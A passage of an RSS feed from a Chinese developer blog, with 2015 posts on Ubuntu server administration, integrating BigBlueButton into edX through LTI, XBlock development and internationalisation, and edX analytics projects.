&lt;span class="n"&gt;mail_host&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;smtp.example.com&amp;quot;&lt;/span&gt;  &lt;span class="c1"&gt;#设置服务器&lt;/span&gt;
&lt;span class="n"&gt;mail_user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;user@example.com&amp;quot;&lt;/span&gt;    &lt;span class="c1"&gt;#用户名&lt;/span&gt;
&lt;span class="n"&gt;mail_pass&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;   &lt;span class="c1"&gt;#口令&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;使用&lt;/h1&gt;
&lt;h3&gt;mac/linux&lt;/h3&gt;
&lt;p&gt;sudo python for_dinner.py  &lt;/p&gt;
&lt;p&gt;其中/tmp是需要监控的目录&lt;/p&gt;
&lt;p&gt;关机权限需要sudo &lt;/p&gt;
&lt;h3&gt;windows&lt;/h3&gt;
&lt;p&gt;写一个bat脚本&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#run.bat&lt;/span&gt;
python for_dinner.py
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;右键以管理员身份运行&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 16 Aug 2015 00:00:00 +0000</pubDate><guid>tag:,2015-08-16:for-dinner.html</guid><category>技术</category></item><item><title>ubuntu server日常</title><link>/ubuntu-server-daily.html</link><description>&lt;h1&gt;系统信息&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;lsb_release -a&lt;/code&gt;:发行版信息&lt;/li&gt;
&lt;li&gt;&lt;code&gt;uname&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;uname -a&lt;/code&gt;:Unix／kernel 信息&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;支持中文&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo apt-get install language-pack-zh-hant language-pack-zh-hans
sudo vim /etc/environment
&lt;span class="nv"&gt;LANG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;zh_CN.UTF8&amp;quot;&lt;/span&gt;
&lt;span class="nv"&gt;LANGUAGE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;zh_CN:zh:en_US:en&amp;quot;&lt;/span&gt;




sudo vim /etc/default/locale
&lt;span class="nv"&gt;LANG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;zh_CN.UTF-8&amp;quot;&lt;/span&gt;
&lt;span class="nv"&gt;LANGUAGE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;zh_CN:zh&amp;quot;&lt;/span&gt;

sudo reboot
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;设置fish为默认的shell&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo apt-get install fish
chsh -s /usr/bin/fish
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;使用mosh连接远程服务器&lt;/h1&gt;
&lt;p&gt;想在mac下使用mosh连接服务器(服务器端也需要安装mosh)，两边的语言环境最好相同（可都做以上「支持中文」设置），否则可能因为LANG的问题报错&lt;/p&gt;
&lt;h1&gt;IP&lt;/h1&gt;
&lt;p&gt;vim /etc/network/interfaces&lt;/p&gt;
&lt;h3&gt;以DHCP方式配置网卡&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;auto eth0  
iface eth0 inet dhcp
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;重启使网络生效：&lt;code&gt;sudo /etc/init.d/networking restart&lt;/code&gt; &lt;/p&gt;
&lt;h3&gt;配置静态IP&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# The primary network interface  &lt;/span&gt;
auto eth0  
iface eth0 inet static  
address 192.168.2.1  
gateway 192.168.2.254  
netmask 255.255.255.0  
&lt;span class="c1"&gt;#network 192.168.2.0  &lt;/span&gt;
&lt;span class="c1"&gt;#broadcast 192.168.2.255 &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;重启生效:&lt;code&gt;sudo /etc/init.d/networking restart&lt;/code&gt; &lt;/p&gt;
&lt;h1&gt;配置DNS&lt;/h1&gt;
&lt;p&gt;sudo vim /etc/resolvconf/resolv.conf.d/tail&lt;/p&gt;
&lt;p&gt;添加内容格式和&lt;code&gt;/etc/resolv.conf&lt;/code&gt;相同:&lt;code&gt;nameserver 8.8.8.8&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;重启使网络生效:&lt;code&gt;sudo /etc/init.d/resolvconf restart&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;查看端口&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;sudo lsof -i:8000&lt;/code&gt;:查看8000端口被什么占用&lt;/p&gt;
&lt;h3&gt;永久生效&lt;/h3&gt;
&lt;p&gt;sudo vim /etc/resolvconf/resolv.conf.d/base&lt;br /&gt;
sudo resolvconf -u&lt;/p&gt;
&lt;h1&gt;交换分区&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo dd &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/zero &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/swapfile &lt;span class="nv"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4096&lt;/span&gt; &lt;span class="nv"&gt;bs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1M &lt;span class="c1"&gt;# sudo dd if=/dev/zero of=/wwjdata/swapfile count=8096 bs=1M&lt;/span&gt;
sudo chmod &lt;span class="m"&gt;600&lt;/span&gt; /swapfile
sudo mkswap /swapfile
sudo swapon /swapfile
sudo &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/swapfile swap swap auto 0 0&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sudo tee -a /etc/fstab
sudo sysctl -w vm.swappiness&lt;span class="o"&gt;=&lt;/span&gt;10
sudo &lt;span class="nb"&gt;echo&lt;/span&gt; vm.swappiness &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sudo tee -a /etc/sysctl.conf
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;设置ssh免登陆&lt;/h1&gt;
&lt;p&gt;ssh-copy-id ~/.ssh/id_rsa.pub wwj@192.168。1.100 &lt;/p&gt;
&lt;h1&gt;z jump&lt;/h1&gt;
&lt;p&gt;look at &lt;a href="https://raw.githubusercontent.com/wwj718/mytools/master/startMyUbuntu.sh"&gt;startMyUbuntu.sh&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;删除&lt;/h1&gt;
&lt;p&gt;sudo apt-get remove --purge xxx&lt;/p&gt;
&lt;h1&gt;systemctl&lt;/h1&gt;
&lt;p&gt;Systemctl是一个systemd工具，主要负责控制systemd系统和服务管理器。&lt;/p&gt;
&lt;p&gt;Systemd是一个系统管理守护进程、工具和库的集合&lt;/p&gt;
&lt;p&gt;进程管理推荐用supervisor，这里介绍些 systemctl&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;分析启动时各个进程花费的时间: &lt;code&gt;systemd-analyze blame&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;如何激活服务并在启动时启用或禁用服务&lt;ul&gt;
&lt;li&gt;systemctl is-active ajenti.service&lt;/li&gt;
&lt;li&gt;systemctl enable ajenti.service&lt;/li&gt;
&lt;li&gt;systemctl disable ajenti.service&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;资料&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://linuxtools-rst.readthedocs.org/zh_CN/latest/index.html"&gt;Linux工具快速教程&lt;/a&gt;:已经按用途做了分类，方便参考&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 15 Aug 2015 00:00:00 +0000</pubDate><guid>tag:,2015-08-15:ubuntu-server-daily.html</guid><category>ubuntu</category></item><item><title>雇佣我</title><link>/employ-me.html</link><description>&lt;p&gt;我都擅长些啥：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Everything about edX&lt;/li&gt;
&lt;li&gt;网站架构&lt;/li&gt;
&lt;li&gt;网站开发与咨询&lt;/li&gt;
&lt;li&gt;Python &lt;/li&gt;
&lt;li&gt;Django&lt;/li&gt;
&lt;li&gt;web爬虫&lt;/li&gt;
&lt;li&gt;微信&lt;/li&gt;
&lt;/ul&gt;
&lt;iframe src="https://jinshuju.net/f/cYcDbq" width="100%" height="1550px"&gt;&lt;/iframe&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 14 Aug 2015 00:00:00 +0000</pubDate><guid>tag:,2015-08-14:employ-me.html</guid><category>free</category></item><item><title>LTI与XBlock</title><link>/LTI-and-XBlock.html</link><description>&lt;p&gt;首先我们知道LTI与XBlock都是扩展edx系统的手段,相关介绍可看考&lt;a href="https://open.edx.org/extending-edx"&gt;extending-edx&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在&lt;a href="http://wwj718.github.io/bigbluebutton-integrated-into-edx-with-lti.html"&gt;上一篇文章&lt;/a&gt;的结尾，我提到我试图写一个XBlock来包装外部远程会议系统。这样一来可以做更细粒度的控制。&lt;/p&gt;
&lt;p&gt;这是个很常见且有价值的需求，edx用户如何在edx之外的系统中学习，并且使其看去是个整体，学习进度与成绩都能一体化。&lt;/p&gt;
&lt;h1&gt;想象空间&lt;/h1&gt;
&lt;p&gt;诸如考试系统，仿真系统，问卷系统，我们不必在edx内部构建，完全可以在edx使用LTI来利用外部组件，而许多教育相关的系统都支持LTI。这里列出了许多支持LTI
的组件:&lt;a href="http://www.imsglobal.org/cc/statuschart.cfm"&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;思路&lt;/h1&gt;
&lt;p&gt;为了做到更细粒度的控制，我们需要把LTI和XBlock进行整合，目的在于：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用LTI与外部系统通信&lt;/li&gt;
&lt;li&gt;使用XBlock来控制个性化的数据(提供存储功能)，用户身份，以及相关的业务逻辑，由于XBlock可以访问edx的所有代码，所以即便整合到成绩系统中也是可以的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;那么思路就是使用XBlock来包装LTI组件。&lt;/p&gt;
&lt;p&gt;我个人对LTI相关的知识并不熟悉，只知道大致的使用方法，自己来实现估计很困难。所以去edx google group寻找一番，发现@James Tauber 提到Queensland大学（澳大利亚）的@John Zornig已经做出了LTI XBlock原型。@John Zornig本人在帖子中冒出来说:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I'm the technical lead on the edX team at UQ.  We've been building an LTI XBlock that will allow LTI tools to be integrated into XBlock based courses. The XBlock is at a point where it can configure and launch external tools from the XBlock workbench and we are waiting on XBlock support in the Studio and edX LMS so that we can deal with some of the deeper integration issues. We do intend for it to be opensourced but currently the code is just available in-house. So far we've implemented LTI 1.x with Outcomes and the Memberships and Settings extensions. &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;看情况似乎是说有打算开源，只是当时XBlock本身有待完善。&lt;/p&gt;
&lt;p&gt;时间一晃过去了两年，XBlock倒是很完善了，似乎没有看到他们开源LTI XBlock项目，不知道是不是中途夭折了。&lt;/p&gt;
&lt;p&gt;邮件组去年就这个问题还有人追问，@John Zornig却没发言，如果小伙伴们有看到这个项目，求发邮件通知一下我。&lt;/p&gt;
&lt;p&gt;本来下午想给@John Zornig发个邮件问下的，最近vpn一直无法连接 orz&lt;/p&gt;
&lt;p&gt;另外如果有小伙伴近期在整合edx和外部系统的也欢迎交流&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 11 Aug 2015 00:00:00 +0000</pubDate><guid>tag:,2015-08-11:LTI-and-XBlock.html</guid><category>edx</category></item><item><title>integrated bigbluebutton(bbb) to edx</title><link>/bigbluebutton-integrated-into-edx-with-lti.html</link><description>&lt;h1&gt;bigbluebutton是什么鬼&lt;/h1&gt;
&lt;p&gt;这是个远程会议系统，支持&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;多用户在线视频/语音会议&lt;/li&gt;
&lt;li&gt;会议录制&lt;/li&gt;
&lt;li&gt;远程教学&lt;/li&gt;
&lt;li&gt;支持演讲模式（切换主讲人，听众）&lt;/li&gt;
&lt;li&gt;支持在线演讲模式，共享文件，批注，讨论&lt;/li&gt;
&lt;li&gt;支持上传图片，文件（word，pdf，excel），共享，批注&lt;/li&gt;
&lt;li&gt;支持以lti方式集成&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;展示下成果先&lt;/h1&gt;
&lt;p&gt;在lms中&lt;/p&gt;
&lt;p&gt;&lt;img alt="4" src="img/edx/meeting/bigblue4.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="5" src="img/edx/meeting/bigblue5.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="6" src="img/edx/meeting/bigblue6.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;在studio中设置LTI组件参数&lt;/p&gt;
&lt;p&gt;&lt;img alt="7" src="img/edx/meeting/bigblue7.jpeg" /&gt;&lt;/p&gt;
&lt;h1&gt;edx是什么鬼&lt;/h1&gt;
&lt;p&gt;这是个野心勃勃的项目&lt;/p&gt;
&lt;p&gt;话说回来，你都不知道edx是什么鬼的话，你看这个干嘛orz，赶紧关了浏览器，写暑假作业去&lt;/p&gt;
&lt;h1&gt;LTI是什么鬼&lt;/h1&gt;
&lt;p&gt;LTI的全称是Learning Tools Interoperability&lt;/p&gt;
&lt;p&gt;这是一种扩展既有系统的方式&lt;/p&gt;
&lt;p&gt;顺便说一下，edx的LTI基于&lt;a href="http://www.imsglobal.org/LTI/v1p1p1/ltiIMGv1p1p1.html"&gt;IMS Global Learning Tools Interoperability&lt;/a&gt; version 1.1.1 ]&lt;/p&gt;
&lt;p&gt;而bigbluebutton支持的是1.0 , 不过似乎兼容&lt;/p&gt;
&lt;p&gt;更多的组件可参考&lt;a href="http://www.imsglobal.org/cc/statuschart.cfm"&gt;www.imsglobal.org/&lt;/a&gt;,其中就列出了bigbluebutton&lt;/p&gt;
&lt;h1&gt;关键步骤&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;在studio中，参考：&lt;a href="http://edx-partner-course-staff.readthedocs.org/en/latest/exercises_tools/lti_component.html"&gt;lti_component&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;在bigbluebutton中，参考&lt;a href="http://docs.bigbluebutton.org/install/lti.html#installation-of-lti-module"&gt;installation-of-lti-module&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;此外google group中也有这个问题的：&lt;a href="https://groups.google.com/forum/#!topic/edx-code/zjbt-tPiJsA"&gt;讨论&lt;/a&gt;，参与者中包括bigbluebutton的项目负责人&lt;/p&gt;
&lt;p&gt;经过以上工作我们就能在edx中使用bigbluebutton来开设在线课堂或是远程会议了，使用起来很像课程组件，可以嵌入到任意单元中，而且互相独立（这个特性在bigbluebutton demo中是做不到的）&lt;/p&gt;
&lt;p&gt;我们在bigbluebutton LTI课件模块中，可以手动设置以下参数：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;record&lt;/li&gt;
&lt;li&gt;duration&lt;/li&gt;
&lt;li&gt;welcome&lt;/li&gt;
&lt;li&gt;voicebridge&lt;/li&gt;
&lt;li&gt;mode&lt;/li&gt;
&lt;li&gt;all_moderators&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;此外edx LTI还提供了诸如是集成到页面内还是启用新页面之类的选项，很是周到。甚至外部系统还可以回传学生得分情况&lt;/p&gt;
&lt;h1&gt;下一步计划&lt;/h1&gt;
&lt;p&gt;弄清lti的原理，猜测是get传参。&lt;/p&gt;
&lt;p&gt;据此打造XBlock，这样更够做到基于用户角色更细度的控制，诸如设置学生为viewer，设置课程团队成员为moderator，带来更高灵活性，以及更好的可编程特性&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 10 Aug 2015 00:00:00 +0000</pubDate><guid>tag:,2015-08-10:bigbluebutton-integrated-into-edx-with-lti.html</guid><category>edx</category></item><item><title>edx数据分析相关的项目</title><link>/edx-analyse-project.html</link><description>&lt;h1&gt;综述&lt;/h1&gt;
&lt;p&gt;edx的数据分析这块，国内几乎全部无法正常使用，不得不说是个遗憾。&lt;/p&gt;
&lt;p&gt;edx在数据分析这块的功能其实极其强大，而且潜力极大，因为数据的开放性以及强大的track log系统。&lt;/p&gt;
&lt;p&gt;目前这这一块相关的项目中，我对以下几个十分关注：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;官方的insights&lt;/li&gt;
&lt;li&gt;edX 学习面板挑战赛的获胜作品&lt;/li&gt;
&lt;li&gt;加拿大 麦吉尔大学的edx数据分析报表项目&lt;/li&gt;
&lt;li&gt;西班牙  University Carlos III of Madrid（马德里卡洛斯三世大学)为edx扩充了12项可视化分析结果&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;前三个我此前做过介绍，在此就不赘述了，有兴趣的小伙伴可以翻阅我此前的文章：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://wwj718.github.io/edx-analytics-pipeline-code-analysis.html"&gt;edx-analytics-pipeline源码解读&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://wwj718.github.io/edX-Learning-Dashboard-Challenge.html"&gt;edX 学习面板挑战赛落幕&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://wwj718.github.io/edx-tracking-logs-data-research.html"&gt;基于tracking logs的数据分析&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;来自University Carlos III of Madrid的数据分析项目&lt;/h1&gt;
&lt;p&gt;今天介绍下University Carlos III of Madrid的工作成果，这是个令人热血沸腾的实验项目。&lt;/p&gt;
&lt;p&gt;项目地址&lt;a href="https://github.com/jruiperezv/ANALYSE"&gt;jruiperezv/ANALYSE&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Gradient实验室是基于edx-platform hotfix-2014-11-17来开发这个项目的，我前段时间把它迁移到了birch上。目前大部分功能已经可用，存在的问题是效率有待提高.国内使用的话，还需要解决几个youtube接口相关的问题，否则无法使用。&lt;/p&gt;
&lt;h2&gt;技术层面上它是什么&lt;/h2&gt;
&lt;p&gt;它仅是一个django app，所以耦合度控制得很好，易于迁移&lt;/p&gt;
&lt;p&gt;每次数据分析是通过celery在后台执行分析任务（设置时间间隔）&lt;/p&gt;
&lt;h2&gt;它干了什么&lt;/h2&gt;
&lt;p&gt;它首先会在课程面板上添加一个tab,就像这样
&lt;img alt="analysis1" src="img/edx/jruiperezv_analysis/analysis1.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;数据分析面板里有以下三类内容
&lt;img alt="analysis2" src="img/edx/jruiperezv_analysis/analysis2.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;分别是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;3个习题相关的可视化模块&lt;/li&gt;
&lt;li&gt;4个学生观看视频相关的可视化模块&lt;/li&gt;
&lt;li&gt;5个学生课程活动相关的可视化模块&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;特性&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;课程教员&lt;/code&gt;可以查看选课学生群体的学习状况，也可以单独查看单个学生。既可以看到课程学习概况，也可以追踪每个学生的进度&lt;/li&gt;
&lt;li&gt;&lt;code&gt;选课学生&lt;/code&gt;可以看到自己的学习进度，以此做出反思&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;没图说个xx&lt;/h2&gt;
&lt;p&gt;好的，这就上图&lt;/p&gt;
&lt;p&gt;&lt;img alt="analysis3" src="img/edx/jruiperezv_analysis/analysis3.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="analysis4" src="img/edx/jruiperezv_analysis/analysis4.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="analysis5" src="img/edx/jruiperezv_analysis/analysis5.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="analysis6" src="img/edx/jruiperezv_analysis/analysis6.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="analysis7" src="img/edx/jruiperezv_analysis/analysis7.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="analysis8" src="img/edx/jruiperezv_analysis/analysis8.jpeg" /&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 07 Aug 2015 00:00:00 +0000</pubDate><guid>tag:,2015-08-07:edx-analyse-project.html</guid><category>edx</category></item><item><title>将edx作为子系统</title><link>/edx-as-subsystem.html</link><description>&lt;h1&gt;需求描述&lt;/h1&gt;
&lt;p&gt;有一种需求可能蛮典型，将edx作为子系统，外部系统需要与edx通信，诸如取得学员的学习状况，学习成绩，个人信息&lt;/p&gt;
&lt;p&gt;又或者需要从企业系统中将用户批量导入edx中&lt;/p&gt;
&lt;h1&gt;思路&lt;/h1&gt;
&lt;p&gt;尽管我们可以通过写脚本来应对以上需求，但我更喜欢将edx视为一个独立/有应答能力的系统，它能够响应外部网站管理级别的请求，而不仅仅是普通用户级别，它与外部的通信都通过RESTful风格的API来做。如此一来edx就能作为子系统与企业其他系统友好协作&lt;/p&gt;
&lt;h3&gt;流程&lt;/h3&gt;
&lt;p&gt;client携带令牌(access token)去访问edx系统，edx对其进行身份权限验证，通过的话，接受其请求。这些都是透明的,edx所采用的django-rest-framework框架对权限的控制设计得很棒 &lt;/p&gt;
&lt;p&gt;这方面的知识我在&lt;a href="http://wwj718.github.io/edx-api.html"&gt;启用edx的API&lt;/a&gt;里谈到过&lt;/p&gt;
&lt;p&gt;核心概念是oauth2和RESTful风格的API&lt;/p&gt;
&lt;p&gt;edx内部已经有许多现成的api接口：学生相关的，课程内容相关的，注册课程相关的，等等，更多细节可以参考&lt;a href="http://edx-platform-api.readthedocs.org/en/latest/index.html"&gt;edx-platform-api&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;扩展&lt;/h3&gt;
&lt;p&gt;为了实现我们自己的需求，现成的接口肯定是不够用的，我们需要扩展edx的api，我去年为了给手机端提供论坛接口，使用django来写，痛苦不堪，在此推荐大家使用django-rest-framework来为edx扩展接口，至于怎么做可以参考&lt;a href="http://www.django-rest-framework.org/"&gt;django-rest-framework&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;举个栗子&lt;/h1&gt;
&lt;p&gt;我们就拿上头的用户批量导入为例&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;首先建立个自己的django app，我将其起名为siteapi（站点管理级别的api接口）&lt;/li&gt;
&lt;li&gt;确定URI： siteapi/users&lt;/li&gt;
&lt;li&gt;写业务逻辑&lt;/li&gt;
&lt;li&gt;client 携带&lt;code&gt;access token&lt;/code&gt;往siteapi/users post用户数据（推荐使用json）&lt;/li&gt;
&lt;li&gt;edx验证用户身份，导入用户，返回确认信息给client&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 05 Aug 2015 00:00:00 +0000</pubDate><guid>tag:,2015-08-05:edx-as-subsystem.html</guid><category>edx</category></item><item><title>搭建远程会议系统(简单得集成到edx里)</title><link>/bigbluebutton-install.html</link><description>&lt;p&gt;这一周简直就是在客串系统管理员啊，搭建各种服务还是挺有意思的&lt;/p&gt;
&lt;p&gt;公司目前人员比较分散，挺多城市都有，可能需要召开远程会议什么的。&lt;/p&gt;
&lt;p&gt;edx项目中似乎也有远程教学的需求，所以准备搭建一个远程会议系统&lt;/p&gt;
&lt;h1&gt;github&lt;/h1&gt;
&lt;p&gt;首先当然是去github搜索一番，键入conference。按照star降序排列我们看到：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/muaz-khan/WebRTC-Experiment"&gt;WebRTC-Experiment&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/bigbluebutton/bigbluebutton"&gt;bigbluebutton&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/plivo/voicechat"&gt;voicechat&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;筛选一番觉得bigbluebutton挺靠谱的，就试着搭建它吧&lt;/p&gt;
&lt;h1&gt;install bigbluebutton&lt;/h1&gt;
&lt;p&gt;按照官方文档就好:&lt;a href="htt//docs.bigbluebutton.org/install/install.html"&gt;install&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;LTI相关&lt;/h1&gt;
&lt;p&gt;下一步的计划是使用LTI嵌入到edx中，这样一来在线的演讲/协同作业以及语音/视频讨论就可行了&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://open.edx.org/learning-tools-interoperability"&gt;learning-tools-interoperability&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://edx-partner-course-staff.readthedocs.org/en/latest/exercises_tools/lti_component.html"&gt;lti_component&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.bigbluebutton.org/install/lti.html#installation-of-lti-module"&gt;installation-of-lti-module&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;展示一下效果(简单得集成到edx里)&lt;/h1&gt;
&lt;p&gt;目前采用的是使用js将两个系统的用户简易关联&lt;/p&gt;
&lt;p&gt;&lt;img alt="1" src="img/edx/meeting/bigblue.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;视频模式，支持多人会议，音频设备可用&lt;/p&gt;
&lt;p&gt;&lt;img alt="2" src="img/edx/meeting/bigblue2.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;演讲模式下支持图片/pdf/word/ppt/excel 之类的东西，方便大家交流和写写画画&lt;/p&gt;
&lt;p&gt;&lt;img alt="3" src="img/edx/meeting/bigblue3.jpeg" /&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 04 Aug 2015 00:00:00 +0000</pubDate><guid>tag:,2015-08-04:bigbluebutton-install.html</guid><category>edx</category></item><item><title>XBlock的国际化和本地化问题</title><link>/XBlocks-I18N.html</link><description>&lt;p&gt;此前遇到过XBlock中translation相关的问题，解决得很是敷衍，上周末@MT兄也提到这个问题，于是认真解决了下&lt;/p&gt;
&lt;h1&gt;需求场景&lt;/h1&gt;
&lt;p&gt;我们可能在两类场景中需要考虑translation相关的问题:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用国外的开发者的XBlock,需要考虑汉化&lt;/li&gt;
&lt;li&gt;自己做的XBlock，想贡献给社区&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对于第一个问题，直接看下边的解决方案就行。对于第二个问题，需要我们在代码和模板里标注翻译字符串&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;#在代码里
from django.utils.translation import ugettext as _
_(&amp;quot;hello world&amp;quot;)
#在模板里,首先将 {% load i18n %} 放在模板最前面
&amp;lt;title&amp;gt;{% trans &amp;quot;hello world&amp;quot; %}&amp;lt;/title&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;解决方案&lt;/h1&gt;
&lt;h3&gt;使用mako模板&lt;/h3&gt;
&lt;p&gt;此前在群里同@Datochen兄讨论过这个话题，他当时的解决方案是使用mako模板，mako模板支持unicode，所以可以直接写中文。这个方案无法解决以上的两个问题，它能做的是允许你在自己开发的XBlock里写中文字符串&lt;/p&gt;
&lt;p&gt;具体的做法可以参考@Datochen兄的&lt;a href="http://icfly.cn/post/18.html"&gt;博客&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;使用django的国际化机制&lt;/h3&gt;
&lt;p&gt;为了解决以上两个问题，我决定采用django的国际化机制&lt;/p&gt;
&lt;p&gt;思路是将XBlock伪装成django app&lt;/p&gt;
&lt;p&gt;具体步骤如下:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将XBlock软链接到django app目录下&lt;/li&gt;
&lt;li&gt;进入XBlock，mkdir locale&lt;/li&gt;
&lt;li&gt;收集翻译字符串，生成.po文件：django-admin.py makemessages -l zh_CN&lt;/li&gt;
&lt;li&gt;翻译po文件&lt;/li&gt;
